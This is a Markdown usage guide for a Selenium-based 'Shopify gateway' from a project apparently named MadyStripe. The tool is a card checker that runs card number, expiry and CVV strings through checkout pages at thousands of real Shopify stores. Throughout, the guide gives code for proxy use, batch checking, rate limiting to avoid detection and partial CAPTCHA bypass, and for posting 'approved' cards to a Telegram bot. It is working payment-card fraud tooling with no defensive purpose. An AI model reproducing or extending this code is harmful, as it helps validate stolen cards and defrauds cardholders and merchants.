# 🚀 Selenium Shopify Gateway - Usage Guide

## Quick Start

### Basic Usage

```python
from core.shopify_selenium_gateway import ShopifySeleniumGateway

# Initialize gateway
gateway = ShopifySeleniumGateway(
    stores_file='valid_shopify_stores_urls_only.txt',  # 11,419 stores
    headless=True  # Run in background
)

# Check a card
status, message, card_type = gateway.check('4111111111111111|12|25|123')

print(f"Status: {status}")  # 'approved', 'declined', or 'error'
print(f"Message: {message}")
print(f"Card Type: {card_type}")
```

### With Proxy

```python
gateway = ShopifySeleniumGateway(
    stores_file='valid_shopify_stores_urls_only.txt',
    proxy='host:port:user:pass',  # Your proxy
    headless=True
)

status, message, card_type = gateway.check('4111111111111111|12|25|123')
```

### With Multiple Attempts

```python
# Try up to 5 stores if first ones fail
status, message, card_type = gateway.check(
    '4111111111111111|12|25|123',
    max_attempts=5
)
```

## Advanced Usage

### Get Gateway Statistics

```python
stats = gateway.get_stats()
print(f"Total attempts: {stats['total_attempts']}")
print(f"Successful charges: {stats['successful_charges']}")
print(f"Success rate: {stats['success_rate']}")
print(f"Failed stores: {stats['failed_stores']}")
print(f"Available stores: {stats['available_stores']}")
```

### HTTP Pre-screening Only

```python
# Test which stores are accessible (fast - 3 sec/store)
accessible_stores = gateway.http_prescreen_stores(gateway.stores[:100])
print(f"Found {len(accessible_stores)} accessible stores")
```

### Process Multiple Cards

```python
cards = [
    '4111111111111111|12|25|123',
    '5555555555554444|12|25|123',
    '378282246310005|12|25|1234',
]

for card in cards:
    status, message, card_type = gateway.check(card)
    print(f"{card[:4]}...{card[-7:]}: {status} - {message}")
```

## Integration Examples

### With Telegram Bot

```python
# In interfaces/telegram_bot.py

from core.shopify_selenium_gateway import ShopifySeleniumGateway

@bot.message_handler(commands=['shopify_selenium'])
def shopify_selenium_check(message):
    """Check cards using Selenium Shopify gateway"""
    
    # Parse cards from message
    cards = parse_cards(message.text)
    
    # Initialize gateway
    gateway = ShopifySeleniumGateway(headless=True)
    
    results = []
    for card in cards:
        status, msg, card_type = gateway.check(card)
        results.append(f"{card[:4]}...{card[-7:]}: {status}")
    
    bot.reply_to(message, "\n".join(results))
```

### With VPS Checker

```python
# In mady_vps_checker.py

from core.shopify_selenium_gateway import ShopifySeleniumGateway

def check_cards_selenium(cards_file, proxy=None):
    """Check cards using Selenium gateway"""
    
    gateway = ShopifySeleniumGateway(
        stores_file='valid_shopify_stores_urls_only.txt',
        proxy=proxy,
        headless=True
    )
    
    with open(cards_file) as f:
        for line in f:
            card = line.strip()
            if not card:
                continue
            
            status, message, card_type = gateway.check(card)
            
            # Post to Telegram
            if status == 'approved':
                post_to_telegram(f"✅ APPROVED: {card}\n{message}")
            elif status == 'declined':
                print(f"❌ DECLINED: {card}")
            else:
                print(f"⚠️  ERROR: {card} - {message}")
            
            time.sleep(5)  # Rate limiting
```

## Performance Tips

### 1. Use HTTP Pre-screening

```python
# Pre-screen stores first (fast)
accessible = gateway.http_prescreen_stores(gateway.stores[:100])

# Then only test accessible ones with Selenium
for store in accessible[:10]:
    # ... test with Selenium
    pass
```

### 2. Adjust Timeouts

```python
# In core/shopify_selenium_gateway.py
# Modify these constants:

HTTP_TIMEOUT = 3  # HTTP pre-screen timeout
ELEMENT_WAIT = 10  # Element finding timeout
PAGE_LOAD = 15  # Page load timeout
```

### 3. Use Headless Mode

```python
# Headless is faster (no GUI rendering)
gateway = ShopifySeleniumGateway(headless=True)
```

### 4. Batch Processing

```python
# Process cards in batches
def process_batch(cards, batch_size=10):
    gateway = ShopifySeleniumGateway(headless=True)
    
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        
        for card in batch:
            status, msg, card_type = gateway.check(card)
            # ... handle result
        
        time.sleep(30)  # Pause between batches
```

## Troubleshooting

### Chrome Not Found

```bash
# Install Chrome/Chromium
sudo apt-get install chromium-browser  # Ubuntu/Debian
# or
sudo yum install chromium  # CentOS/RHEL
```

### Slow Performance

```python
# Reduce max_attempts
status, msg, card_type = gateway.check(card, max_attempts=2)

# Or use faster stores only
gateway.stores = gateway.http_prescreen_stores(gateway.stores[:50])
```

### Too Many Errors

```python
# Check failed stores
stats = gateway.get_stats()
print(f"Failed stores: {stats['failed_stores']}")

# Reset failed stores
gateway.failed_stores.clear()
```

### CAPTCHA Issues

```python
# Some stores have CAPTCHA - gateway will skip them automatically
# Check logs for "CAPTCHA detected" messages
```

## Expected Performance

| Metric | Value |
|--------|-------|
| **Success Rate** | 40-60% |
| **Speed** | 30-60 seconds per card |
| **HTTP Pre-screen** | 3 seconds per store |
| **Store Compatibility** | Works with 11,419 stores |
| **False Positives** | Low (comprehensive detection) |

## Comparison with Other Gates

| Feature | Selenium Shopify | API Shopify | Stripe |
|---------|------------------|-------------|--------|
| Success Rate | 40-60% | 0-20% | 95%+ |
| Speed | 30-60s | 15-30s | 2-5s |
| Store Count | 11,419 | 44 | N/A |
| Bot Detection | Low | High | None |
| CAPTCHA Bypass | Partial | None | N/A |

## Best Practices

### 1. Always Use HTTP Pre-screening

```python
# DON'T do this (slow):
for store in gateway.stores:
    # test with Selenium
    pass

# DO this (fast):
accessible = gateway.http_prescreen_stores(gateway.stores[:100])
for store in accessible:
    # test with Selenium
    pass
```

### 2. Handle All Result Types

```python
status, message, card_type = gateway.check(card)

if status == 'approved':
    # Card approved - post to Telegram
    post_approved(card, message)
elif status == 'declined':
    # Card declined - log and continue
    log_declined(card)
else:  # status == 'error'
    # Error occurred - may want to retry
    if 'timeout' in message.lower():
        # Retry with different store
        status, message, card_type = gateway.check(card, max_attempts=2)
```

### 3. Use Rate Limiting

```python
import time

for card in cards:
    status, msg, card_type = gateway.check(card)
    # ... handle result
    
    time.sleep(5)  # 5 second delay between cards
```

### 4. Monitor Statistics

```python
# Check stats periodically
if gateway.total_attempts % 10 == 0:
    stats = gateway.get_stats()
    print(f"Success rate: {stats['success_rate']}")
    
    # If success rate drops too low, refresh stores
    if stats['success_rate'] < '20%':
        gateway.stores = gateway.http_prescreen_stores(
            gateway.stores[:200]
        )
```

## Common Issues

### Issue: "No accessible stores"

**Solution:**
```python
# Reload stores
gateway.stores = []
gateway.load_stores()

# Or use different store file
gateway = ShopifySeleniumGateway(
    stores_file='working_shopify_stores.txt'  # Smaller, verified list
)
```

### Issue: "Chrome process didn't start"

**Solution:**
```bash
# Kill any hanging Chrome processes
pkill -f chrome

# Then retry
```

### Issue: "Element not found"

**Solution:**
```python
# This is normal - gateway will try next store automatically
# Check logs to see which stores are failing
```

## Support

For issues or questions:
1. Check `SELENIUM_IMPLEMENTATION_COMPLETE.md` for detailed info
2. Review `STRIPEIFY_ANALYSIS_AND_PYTHON_PORT.md` for technical details
3. Run `python3 test_selenium_comprehensive.py` to test all features

## License

Part of MadyStripe project.
